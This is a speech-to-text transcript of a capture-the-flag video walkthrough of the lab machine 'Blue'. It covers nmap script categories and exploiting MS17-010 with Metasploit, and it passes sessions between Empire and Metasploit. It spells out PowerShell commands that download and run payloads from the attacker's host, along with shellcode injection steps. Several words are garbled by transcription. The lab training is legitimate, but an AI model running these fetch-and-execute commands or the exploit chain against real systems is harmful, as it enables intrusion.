 what's going on YouTube this is if Zack and won't be doing blue from half the box this box may not seem interesting because people popped in a row three minutes but we're gonna do some different things in this video first off we're gonna look into end map because I've said something wrong in every video - SC is not safe scripts it is default scripts there's a big difference we'll look into that then after that we're gonna pop the box with Metasploit with the eternal blue exploit nothing special there once we do that we're gonna pass that session from Metasploit into Empire and do a few things with Empire and then pass it from Empire back to Metasploit so you get familiar with birth those tools so let's jump in let's start off like every other box put the end map - SC for default scripts not save scripts sv and numerate versions output all formats and we'll call the file and map - scripts and the IP address of blue which is 1010 1040 looking at the results we do see no vulnerabilities it just does pure enumeration and this is what made me look into exactly what - SC meant because I knew the eternal blue exploit script was classified as safe so it confused me why it's vulnerability information was not in the output of this end map so if we want to we can search for the eternal blue exploit and the first thing I did was locate for Lu because it could be capital B a lowercase B so I just got rid of the be all together and then I gripped that for anything that ends with dot NS C didn't see anything so I went with the Microsoft Security Bulletin which is MS 17 - 0 1 0 and now we get the vulnerability script looking into this we go to categories and we see it is indeed classified as phone and safe so it should have ran if SC meant safe scripts but again does not it means default so if we want to run just safe scripts against port 4 4 or 5 we can do a map - P 4 4 5 - - script safe and this can be a directory foul named category it's a relatively smart argument so if we just wanted to scan for a total blue we could just copy this and paste it in we can also copy this with and I see we could run everything and just paste this but that is not intended because that runs all scripts including non safe ones so that's our script safe to make good bit quicker I'm going to disable the ping and DNS resolution and we're just do 10 10 10 40 safe scripts will still take a while because it runs a lot of scripts so while it's running let's look at all the other possibilities for nmap scripts so I'm going to grep - or for the wood category and we're looking user share and map scripts start on NSE and we can see all the categories things can be in we got the foul name equals foul name colon and then categories and what they are if we only wanted to see the categories we can do a grep - Oh P because this is so overpowered and search for everything in between quotes and now we just get a list of everything that was in between quotes and we can then sort - you and we get a list of all the potential categories for nmap you get off broadcast brut default discovery denial a service exploit external fuzzer intrusive malware safe version and Vaughn so if you wanted to see what scripts are ran with - SC you could just do grep - are categories on user share and map scripts to NSE then grab that for default and then we could also pipe that to awk field separator as semi colon colon and print one and that's all the scripts that nmap classifies as default but enough of that let's look at the output for safe and we see there is actually a lot of output we have a pre scan information thing that says stuff about I guess layer 2 layer 3 random stuff that may be helpful if you just wanted to I don't know but information then we got a bunch of what is this maybe MS yeah ms RPC enumeration and a lot of information then we got the regular enumeration that we used to seeing in - SC and then we got eternal blue with that SMB Vaughn MS 1701 0 if we want it to be a bit more just targeted at vulnerabilities we could also put this in quotes and do Vaughn and safe and that's only gonna run the vulnerability scripts that are classified as safe we could get rid of that altogether and just do Vaughn and it'll take a little bit because it's gonna run a few more scripts but that's a little bit end to end map and the power it can have and how you can detect some of these vulnerabilities and yeah but now that we know it is vulnerable to eternal blue it is time to exploit it with Metasploit so let's load up Metasploit with MSF console and this could take a few seconds to load and then once this loads we can do search for Ms 1701 zero and we find the exploit here so if we just use this exploit do show options and we don't see exactly what the payload is and I always hate went and show you the payload so let's just set the payload to be Windows x64 meterpreter reverse TCP and then set L host three-ton 0 then we can set our host to be 10 10 10 40 or houses the target and do exploit - J and we're sending the eternal blue exploit saying stager meterpreter session 1 has been opened so now we have an error message but everything seems to be good not exactly sure what that is but everything thing seems fine that was odd so let's just keep continuing like that didn't exist and get Empire so I'm going to actually delete my Empire directory and let's just pull a new one so if we do github Empire we should find it and I always like doing the development version of Empire instead of the master so get clone Empire and then - be for branch only specify dev if you want to you can switch the branch here to dev and then look into commits to see exactly what has changed since master but Empire changes so much and there's so many good quality of life fixes I just like using dev so once we get Empire we have to go into setup and then run the installed on SH script and this doesn't take too long installs a few things and once this finishes we should be able to launch Empire server negotiation password just hit enter for random generation Ram generations great and it runs everything so go back to our Empire directory execute Empire and we're in we have 283 modules installed we can run help to get an idea of what commands we want but the first command I always run is going to be listeners to get into the listeners I guess tab or whatever this means then this opens up new commands so we can do use listener and then specify HTTP well we can just hit tab a few times see what possible listeners there are but we're gonna specify HTTP and then run info info is kind of like to show options of Metasploit and see what things we have so the host we have to change the whole thing and the port we're gonna have to change so we're gonna set the host to be HTTP 10 10 14 16 I think is my IP 14 16 yep and then specify the port and this is something that has just recently changed like within the past week Empire 2 3 the bind port and host you couldn't have different ones and to 4 it changed and you have to set both of them so if I just set this to 4 4 3 and do info we can see the port doesn't change if we set the port to be like 888 and previous versions of Empire it would also change the host but no longer it does that so we also just at the port to be 4 4 3 and this is actually gonna make it SSL with HTTPS but I don't we just use 443 because it's allowed outside of firewalls so once we have all the configuration we can do execute to start the listener and then back out of this once and we can generate a PowerShell payload with launched a PowerShell and then the listener name which is HTTP and we get this PowerShell query then we go back to a box and I'm going to make a directory called HTTP and we do Empire dot ps1 and paste the output of that launcher if you wanted to there are stages that are like launches so we can do you stager and then for windows we have bunny ducky DOL HT a that's a web one bat files VBS files macros macros word document maybe I don't know exactly what that one is but there's a bunch of different stages you can do but if all you want to do is run a command you can just do launch a PowerShell and then you listener so now that we got Empire dot ps1 we do Python M simple HTTP server on port 80 so we can go back to a Windows box session - i1 shell and we can do powershell IX new object net dot web client dot download string then acp ten ten fourteen sixteen slash empire ps1 we see we got that and we have our agent in Empire so we can back out of this go back to the main menu we can type agents and we can see the agent in the last scene time and the delay is five Empire is different in that it's not a I'm gonna give this mess up I can't remember the dysphoria synchronous and asynchronous essentially Empire pulls us every five seconds if we want to change that we can do sleep on all agents - one and now the delay is gonna be set to 1 which means it's gonna check our webserver for commands every single second so if we want to just run a command against one single agent we can do interact with the agent ID I just hit tab so it auto filled and if you didn't know it the name is the agent ID so interact with that agent and we can do use module and then everything's tap Auto completion so we could do let's see use module profess and then power up all checks and then just run execute and it will say the job starts once the agent pulls back to you there we go the job started and it'll show the results in this window once it finishes we could also go back and do help there is a mini cat's hotkey there's also search module mini cats and that's under mainly credentials if we type jobs we can see what jobs are running acute on the Empire agent and that powerup should be finishing any minute now additionally we can load modules into memory if it's not coded Empire yet let's say opt where is it windows previs show up we want to run this script and it looks like we got some bad Unicode there if we delete Sherlock and we'll repol it see if it fix itself github Sherlock phone he's only got masternode EV so Sherlock that's still there excess DPS Sherlock X delete six characters so I think it was only six and that hex to ps1 there we go there was Unicode before that which probably would cause it errors anyways we can go back to Empire invoke all checks had completed so you can see the results because we're already system it's gonna show a bunch of stuff but that's how you run modules and Empire it does have a few commands so we got let's see injection code I don't really like we can get into that in a little bit lost limit is good that's how many times the agents gonna pull you and if you don't exist then kill itself so normally I set this to like 1440 which is on five minutes I think 48 hours who have 24 hours or something so my computer can go offline for a whole day and I'd normally don't lose the session so that's what loss limit is C script CMD execute a function that's currently imported PowerShell script and script import this is what we're going to be using real quick so we can do script import specify I just copied copy this Sherlock dot ps1 and it already pulled that one script into memory so now we can do script CMD find all Vaughn's which is a function that's inside that Sherlock ps1 and now it's going to run that command against the server so we can see it's also vulnerable to m/s 16 134 in case we were not admin but that's how you do custom things in Sherlock let's see the last thing I guess we want to do is pass something back to Metasploit and this is what gets a little tricky so let's go back a few times and we can do something that's probably going to not work and then do it the way I normally do it so we can go back to our listeners tab and do use listener meterpreter I think that's it info set host to be HTTP once every not once that we do 1010 1416 would say a port 8000 one set port 8000 one and what we should be able to do is go back interact background this use exploit multi handler set payload to be Windows x64 meterpreter just waiting for that top autocomplete to finish and then reverse HTTP do info show options is Metasploit zwei I hate how they change set elbows two-ton zero set L port to eight thousand one split - J so what we should be able to do is a PS command to get processes and then pick a process we want so power showering is systems generally a good thing to inject to so we should be able do what is it inject shellcode and I didn't type execute all my listener so listeners news listener meterpreter info already set execute so it started then interact shellcode injection code meterpreter and then the PID of that power shell session do info and if we execute this oh no we have to set the payload to be reverse HTTP execute job started session to opened sesange si2 and we do help and it doesn't actually load the standard api because the core commands we should see a lot more information and I think the issue is the shell code inject only works on a 32-bit process and it's a pain to get a 32-bit process running because if we wanted to the way we would go about that is use module management run as info set CMD to be probably C colon backslash Windows cysts well 64 is it sis well 64 32 yeah I think six well 64 and what matter cuz this won't work but I think that would be the right way to spawn a 32-bit command prompt if we do info we see CMD is true agent is true everything else is false we don't have it so we have everything that's true when we do run or execute and once either credit ID or username so run as you literally need to do run as I don't think there is just a regular run so if we go back the way I normally do this is through unicorn so go back here we do opt unicorn this is trust a sec unicorn you can google it get it off github I've shown you how to clone a few times and then unicorn - - help we have an example here so Python unicorn PI windows meterpreter reverse tcp no we'll do a reverse HTTP and then ten ten fourteen sixteen point two eight thousand two and we're back around this session we will create a 32 bit handler set output to be 8,000 to exploit to SJ and for a completion sake we'll do the injection code but with a 32-bit one this time so we have to go back again listeners use listener meterpreter info set port to be 8,000 to set hos to be HTP 1010 14:16 8,000 to execute we got meterpreter one so we can go back twice interact with the agent and then inject shellcode meterpreter one and I don't me the PID so PS injection code my trip to one two nine nine two should get session soon maybe not I think I do mein to go back to the main listeners ten ten fourteen sixteen eight thousand two that looks right huh back o set L port 8000 to execute see does that one work this time there we go session three open and we still don't have the standard API we can try loading it and then meterpreter is going to crash so unicorn created a file called powershell attacked text so we can just CP opt unicorn power shell attack text to a directory start the simple HTTP server up again and then an empire go back to where we interact with the client we used to shell and this does PowerShell commands so is it get child for something I'm not exactly sure drawing a blank on pouch all commands to do like a door I don't know if that's gonna work oh it does so we need to shell IX new object net dot web client download string HTTP 10 10 14 16 slash PowerShell attack dot txt we see the web server says we sent it and we got meterpreter session 4 open this is still on 3 so background 3 go into 4 and we have full meterpreter session so that's gently how I pass between Empire to Metasploit it looks like it took a long time because I was showing the injection code issue and why I just like doing it through unicorn but hope you guys enjoyed the video yeah take care